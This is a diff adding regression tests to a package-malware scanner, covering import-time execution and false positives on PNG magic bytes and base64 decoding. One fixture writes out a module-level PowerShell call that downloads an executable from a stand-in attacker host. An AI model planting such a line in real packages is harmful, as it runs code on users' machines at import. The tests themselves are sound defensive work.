@@ -1065,3 +1065,91 @@ def test_npm_suspicious_obfuscation_flag_contributes_score():
     report = analyze_npm_package_tarball(tarball, "pkg")
     assert any(f.startswith("SUSPICIOUS_OBFUSCATION") for f in report.flags)
     assert report.composite_threat_score >= 35
+
+
+def test_module_toplevel_dangerous_call_outside_setup_py_is_malicious():
+    """
+    Regression for a real miss: a plain, UNOBFUSCATED `subprocess.run(["powershell",
+    ...])` sitting at module scope in `__init__.py` (not setup.py) scored
+    BENIGN_COMMUNITY, because only setup.py's top level was ever scored for
+    dangerous calls — real confirmed-malicious sample "automsg" did exactly
+    this to download and run an .exe. `import package` runs a module's top
+    level exactly as automatically as `pip install` runs setup.py's.
+    """
+    tarball = _make_tarball({
+        "pkg-1.0.0/setup.py": "from setuptools import setup\nsetup(name='pkg', version='1.0.0')\n",
+        "pkg-1.0.0/pkg/__init__.py": (
+            "import subprocess\n"
+            "subprocess.run(['powershell', '-Command', 'curl.exe -L http://evil.example.com/x.exe -o x.exe'])\n"
+        ),
+    })
+    report = analyze_python_package_tarball(tarball, "pkg")
+    assert any(f.startswith("MODULE_TOPLEVEL_EXECUTION") for f in report.flags)
+    assert report.verdict == ThreatVerdict.MALICIOUS
+
+
+def test_module_toplevel_call_inside_a_function_is_not_flagged():
+    """
+    The distinguishing factor is module SCOPE, not merely "not setup.py": the
+    exact same call, moved inside a function that requires an explicit call to
+    reach, must stay unflagged — this is the existing, already-tested
+    call-time-vs-import-time protection (see the clean-webhook-sdk tests
+    above), and today's module-toplevel fix must not weaken it.
+    """
+    tarball = _make_tarball({
+        "pkg-1.0.0/setup.py": "from setuptools import setup\nsetup(name='pkg', version='1.0.0')\n",
+        "pkg-1.0.0/pkg/__init__.py": (
+            "import subprocess\n"
+            "def run_diagnostics():\n"
+            "    subprocess.run(['echo', 'hello'])\n"
+        ),
+    })
+    report = analyze_python_package_tarball(tarball, "pkg")
+    assert not any(f.startswith("MODULE_TOPLEVEL_EXECUTION") for f in report.flags)
+    assert report.verdict != ThreatVerdict.MALICIOUS
+
+
+def test_dense_hex_escapes_ignores_short_binary_signature_checks():
+    """
+    Regression for a real false positive: `discord-py` (a hugely popular,
+    unambiguously legitimate library) sniffs image formats by checking magic
+    bytes — `data.startswith(b'\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\x0a')` for
+    PNG — which used to trip the "8+ consecutive hex escapes" obfuscation
+    rule. Real obfuscated payloads run far longer (the confirmed-malicious
+    sample that motivated this rule has 47- and 105-escape runs); an 8-byte
+    file signature must not be mistaken for one.
+    """
+    png_check = (
+        "def sniff(data):\n"
+        "    if data.startswith(b'\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\x0a'):\n"
+        "        return 'image/png'\n"
+    )
+    tarball = _make_tarball({
+        "pkg-1.0.0/setup.py": "from setuptools import setup\nsetup(name='pkg', version='1.0.0')\n",
+        "pkg-1.0.0/pkg/__init__.py": png_check,
+    })
+    report = analyze_python_package_tarball(tarball, "pkg")
+    assert not any(f.startswith("SUSPICIOUS_OBFUSCATION") for f in report.flags)
+
+
+def test_layered_decode_ignores_plain_base64_text_decoding():
+    """
+    Regression for a real false positive: `c7n-azure` and `spotapi` (both
+    real, unambiguously legitimate packages) decode a base64-encoded JSON
+    string via `base64.b64decode(x).decode('utf-8')` — an extremely common,
+    totally benign idiom (parsing an event/API/config payload) that used to
+    trip the "layered decode/decompress pipeline" rule. The rule should only
+    fire when the decode feeds into something compressed/executable
+    (zlib/marshal/bz2), not plain text.
+    """
+    benign_decode = (
+        "import base64, json\n"
+        "def parse_event(message):\n"
+        "    return json.loads(base64.b64decode(message.content).decode('utf-8'))\n"
+    )
+    tarball = _make_tarball({
+        "pkg-1.0.0/setup.py": "from setuptools import setup\nsetup(name='pkg', version='1.0.0')\n",
+        "pkg-1.0.0/pkg/__init__.py": benign_decode,
+    })
+    report = analyze_python_package_tarball(tarball, "pkg")
+    assert not any(f.startswith("SUSPICIOUS_OBFUSCATION") for f in report.flags)
